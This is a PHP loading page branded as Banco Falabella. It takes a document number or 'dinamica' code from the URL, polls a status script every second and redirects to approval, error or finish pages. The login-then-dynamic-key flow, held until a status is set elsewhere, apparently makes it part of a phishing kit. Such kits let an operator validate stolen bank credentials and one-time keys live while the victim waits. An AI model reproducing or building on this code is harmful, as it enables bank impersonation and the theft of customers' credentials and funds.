<?php

require_once __DIR__ . '/config/security.php';
send_security_headers();

$documento = isset($_GET['doc'])  ? clean_num(substr($_GET['doc'], 0, 15)) : '';
$dinamica  = isset($_GET['dina']) ? preg_replace('/[^a-zA-Z0-9_]/', '', substr($_GET['dina'], 0, 50)) : '';
$solicitud = isset($_GET['sol'])  ? preg_replace('/[^0-9]/', '', substr($_GET['sol'], 0, 5)) : '';

if ($solicitud !== '') {
    $tipo = 'solicitud';
} elseif ($documento !== '') {
    $tipo = 'login';
} elseif ($dinamica !== '') {
    $tipo = 'dinamica';
} else {
    http_response_code(400);
    die('Falta parámetro requerido');
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando | Banco Falabella</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{
            margin:0;
            font-family: Arial, sans-serif;
            display:flex;
            align-items:center;
            justify-content:center;
            min-height:100vh;
            background:#f5f5f5;
        }
        .loader-box{
            text-align:center;
        }
        .spinner{
            width:50px;
            height:50px;
            border:6px solid #ddd;
            border-top-color:#3cb371;
            border-radius:50%;
            margin:0 auto;
            animation:spin 1s linear infinite;
        }
        @keyframes spin{
            to{transform:rotate(360deg);}
        }
    </style>
</head>
<body>
    <div class="loader-box">
        <div class="spinner"></div>
    </div>

    <script>
        const tipo      = "<?php echo $tipo; ?>";
        const documento = "<?php echo $documento; ?>";
        const dinamica  = "<?php echo $dinamica; ?>";

        if (tipo === 'solicitud') {
            setTimeout(function () {
                window.location.href = 'login.php';
            }, 5000);
        } else {
            async function revisarEstado() {
                try {
                    let url = '';
                    if (tipo === 'login') {
                        url = 'config/estado.php?doc=' + encodeURIComponent(documento) + '&t=' + Date.now();
                    } else {
                        url = 'config/estado.php?dina=' + encodeURIComponent(dinamica) + '&t=' + Date.now();
                    }

                    const resp = await fetch(url);
                    if (!resp.ok) return;

                    const data = await resp.json();
                    if (!data || !data.estado) return;

                    if (tipo === 'login') {
                        if (data.estado === 'ok') {
                            window.location.href = 'approved.php';
                        } else if (data.estado === 'error') {
                            window.location.href = 'login.php?error=1';
                        }
                    } else {
                        if (data.estado === 'ok') {
                            window.location.href = 'finish.php';
                        } else if (data.estado === 'error') {
                            window.location.href = 'dinamica.php?error=1';
                        }
                    }
                } catch (e) {
                }
            }

            setInterval(revisarEstado, 1000);
        }
    </script>
</body>
</html>
